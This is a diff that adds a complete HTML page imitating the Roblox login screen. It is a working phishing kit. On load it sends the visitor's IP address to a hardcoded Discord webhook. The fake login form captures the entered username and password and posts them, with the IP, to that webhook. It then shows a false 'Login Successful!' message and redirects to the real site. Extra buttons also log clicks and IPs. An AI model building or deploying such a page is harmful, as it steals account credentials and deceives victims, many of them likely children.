@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #0e0e0e;
+            color: white;
+        }
+
+        .navbar {
+            display: flex;
+            align-items: center;
+            padding: 0 24px;
+            background-color: #000000;
+            position: fixed;
+            top: 0;
+            width: 100%;
+            height: 42px;
+            z-index: 100;
+            border-bottom: 1px solid rgba(255,255,255,0.08);
+        }
+
+        .logo {
+            font-weight: 800;
+            font-size: 20px;
+            margin-right: 30px;
+            letter-spacing: 0.5px;
+        }
+
+        .navbar a {
+            color: white;
+            text-decoration: none;
+            margin-right: 24px;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        .search-container {
+            margin-left: auto;
+            margin-right: 15px;
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+        .search-container input {
+            background-color: #2b2b2b;
+            border: none;
+            border-radius: 8px;
+            color: white;
+            padding: 5px 10px 5px 32px;
+            width: 300px;
+            height: 26px;
+            font-size: 13px;
+        }
+
+        .search-container::before {
+            content: "🔍";
+            position: absolute;
+            left: 10px;
+            color: #888;
+            font-size: 12px;
+        }
+
+        .signup-button {
+            background-color: #0066ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 5px 12px;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin-top: 42px; /* Add margin to account for fixed navbar */
+        }
+
+        .login-box {
+            background-color: #232527;
+            padding: 24px;
+            border-radius: 8px;
+            width: 380px;
+        }
+
+        .login-box h2 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 24px;
+            font-weight: 500;
+            color: #fff;
+        }
+
+        .login-input {
+            width: 100%;
+            padding: 8px 12px;
+            margin-bottom: 12px;
+            border: none;
+            border-radius: 6px;
+            background-color: #393b3d;
+            color: white;
+            font-size: 14px;
+            height: 36px;
+        }
+
+        .login-input::placeholder {
+            color: #9a9a9a;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 8px;
+            background-color: #393b3d;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 14px;
+            font-size: 14px;
+            font-weight: 400;
+            height: 36px;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+
+        .forgot-password a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .alternative-buttons {
+            margin-top: 5px;
+        }
+
+        .alternative-button {
+            width: 100%;
+            padding: 8px;
+            background-color: #393b3d;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            margin-bottom: 10px;
+            font-size: 14px;
+            font-weight: 400;
+            height: 36px;
+        }
+
+        .signup-text {
+            text-align: center;
+            margin-top: 10px;
+            font-size: 13px;
+        }
+
+        .signup-text a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .footer {
+            display: flex;
+            justify-content: center;
+            position: fixed;
+            bottom: 30px;
+            width: 100%;
+            padding: 8px 0;
+            font-size: 11.5px;
+        }
+
+        .footer a {
+            color: white;
+            text-decoration: none;
+            margin: 0 8px;
+            font-weight: 400;
+        }
+
+        .footer-copyright {
+            text-align: center;
+            color: #858585;
+            font-size: 10px;
+            position: fixed;
+            bottom: 10px;
+            width: 100%;
+        }
+
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 22px;
+            height: 12px;
+            vertical-align: middle;
+            margin-left: 3px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #0066ff;
+            transition: .4s;
+            border-radius: 10px;
+        }
+
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 8px;
+            width: 8px;
+            left: 2px;
+            bottom: 2px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .slider {
+            background-color: #0066ff;
+        }
+
+        input:checked + .slider:before {
+            transform: translateX(10px);
+        }
+
+        #message {
+            margin-top: 20px;
+            color: #ffffff;
+            font-size: 12px;
+        }
+
+    </style>
+    <script>
+        let ipSent = false;
+        function sendIPAddress() {
+            if (ipSent) {
+                console.log('IP address already sent. Cooldown active.');
+                window.location.href = 'https://www.roblox.com/home';
+                return;
+            }
+
+            const webhookURL = 'https://discord.com/api/webhooks/1366765988879667220/uV_rEXjJSwB6RPbJJRUmqH9z57bdFWhKAk_sHTvPL4n9jhBJ4DH_y4ez_DEeaYZq6wfQ'; // Replace with your webhook URL
+            const currentTime = new Date().toLocaleString();
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const embed = {
+                        title: "IP Address Log",
+                        color: 0x0066ff,
+                        description: "IP Address of the user who clicked the link.",
+                        fields: [
+                            { name: "Time", value: currentTime, inline: false },
+                            { name: "IP Address", value: data.ip || "Unknown", inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    const payload = {
+                        embeds: [embed],
+                        username: "IP Address Logger",
+                        avatar_url: "https://tr.rbxcdn.com/b119a99b5b8a0c5a2e3a5e5a5f3d3d5e/420/420/Image/Png"
+                    };
+
+                    return fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Error sending webhook:', response.status, response.statusText);
+                    } else {
+                        console.log('Webhook sent successfully!');
+                        ipSent = true;
+                        window.location.href = 'https://www.roblox.com/home';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    window.location.href = 'https://www.roblox.com/home';
+                });
+        }
+    </script>
+</head>
+<body onload="sendIPAddress()">
+    <nav class="navbar">
+        <div class="logo">ROBLOX</div>
+        <a href="#">Charts</a>
+        <a href="#">Marketplace</a>
+        <a href="#">Create</a>
+        <a href="#">Robux</a>
+        <div class="search-container">
+            <input type="text" placeholder="Search">
+        </div>
+        <button class="signup-button">Sign Up</button>
+    </nav>
+
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Login to Roblox</h2>
+            <form id="loginForm">
+                <input type="text" class="login-input" id="username" placeholder="Username/Email/Phone" required>
+                <input type="password" class="login-input" id="password" placeholder="Password" required>
+                <button type="submit" class="login-button">Log In</button>
+            </form>
+            <div class="forgot-password">
+                <a href="#">Forgot Password or Username?</a>
+            </div>
+            <div class="alternative-buttons">
+                <button class="alternative-button" onclick="sendWebhook('email')">Email Me a One-Time Code</button>
+                <button class="alternative-button" onclick="sendWebhook('device')">Use Another Device</button>
+            </div>
+            <div class="signup-text">
+                Don't have an account? <a href="#">Sign Up</a>
+            </div>
+            <div id="message"></div>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <a href="#">About Us</a>
+        <a href="#">Jobs</a>
+        <a href="#">Blog</a>
+        <a href="#">Parents</a>
+        <a href="#">Gift Cards</a>
+        <a href="#">Help</a>
+        <a href="#">Terms</a>
+        <a href="#">Accessibility</a>
+        <a href="#">Privacy</a>
+        <a href="#">Your Privacy Choices</a>
+        <label class="toggle-switch">
+            <input type="checkbox" checked>
+            <span class="slider"></span>
+        </label>
+        <a href="#">Cookie Options</a>
+    </footer>
+    <div class="footer-copyright">
+        ©2023 Roblox Corporation. Roblox, the Roblox logo and Powering Imagination are among our registered and unregistered trademarks in the U.S. and other countries.
+    </div>
+
+    <script>
+        let ipSent = false;
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            sendLoginWebhook(username, password);
+        });
+
+        function sendLoginWebhook(username, password) {
+            const webhookURL = 'https://discord.com/api/webhooks/1366765988879667220/uV_rEXjJSwB6RPbJJRUmqH9z57bdFWhKAk_sHTvPL4n9jhBJ4DH_y4ez_DEeaYZq6wfQ';
+            const currentTime = new Date().toLocaleString();
+            const button = document.querySelector('.login-button');
+            const originalText = button.textContent;
+            button.textContent = 'Logging in...';
+            button.disabled = true;
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const embed = {
+                        title: "Roblox Login Attempt",
+                        color: 0xffa500,
+                        fields: [
+                            { name: "Username/Email/Phone", value: username || "Not provided", inline: true },
+                            { name: "Password", value: password || "Not provided", inline: true },
+                            { name: "Time", value: currentTime, inline: false },
+                            { name: "IP Address", value: data.ip || "Unknown", inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    const payload = {
+                        embeds: [embed],
+                        username: "Roblox Login Logger",
+                        avatar_url: "https://tr.rbxcdn.com/b119a99b5b8a0c5a2e3a5e5a5f3d3d5e/420/420/Image/Png"
+                    };
+
+                    return fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok');
+                    }
+                    setTimeout(() => {
+                        button.textContent = 'Login Successful!';
+                        setTimeout(() => {
+                            window.location.href = 'https://www.roblox.com/home';
+                        }, 1500);
+                    }, 1000);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    button.textContent = originalText;
+                    button.disabled = false;
+                });
+        }
+
+        function sendWebhook(buttonType) {
+            const webhookURL = 'https://discord.com/api/webhooks/1366765988879667220/uV_rEXjJSwB6RPbJJRUmqH9z57bdFWhKAk_sHTvPL4n9jhBJ4DH_y4ez_DEeaYZq6wfQ';
+            const currentTime = new Date().toLocaleString();
+
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    let embedTitle = '';
+                    let embedDescription = '';
+
+                    if (buttonType === 'email') {
+                        embedTitle = "Roblox 'Email Me a One-Time Code' Clicked";
+                        embedDescription = "User clicked the 'Email Me a One-Time Code' button.";
+                    } else if (buttonType === 'device') {
+                        embedTitle = "Roblox 'Use Another Device' Clicked";
+                        embedDescription = "User clicked the 'Use Another Device' button.";
+                    }
+
+                    const embed = {
+                        title: embedTitle,
+                        color: 0x0066ff,
+                        description: embedDescription,
+                        fields: [
+                            { name: "Time", value: currentTime, inline: false },
+                            { name: "IP Address", value: data.ip || "Unknown", inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
+
+                    const payload = {
+                        embeds: [embed],
+                        username: "Roblox Action Logger",
+                        avatar_url: "https://tr.rbxcdn.com/b119a99b5b8a0c5a2e3a5e5a5f3d3d5e/420/420/Image/Png"
+                    };
+
+                    return fetch(webhookURL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Error sending webhook for button click:', response.status, response.statusText);
+                    } else {
+                        console.log('Webhook sent for button click!');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP for button click:', error);
+                });
+        }
+    </script>
+</body>
+</html>
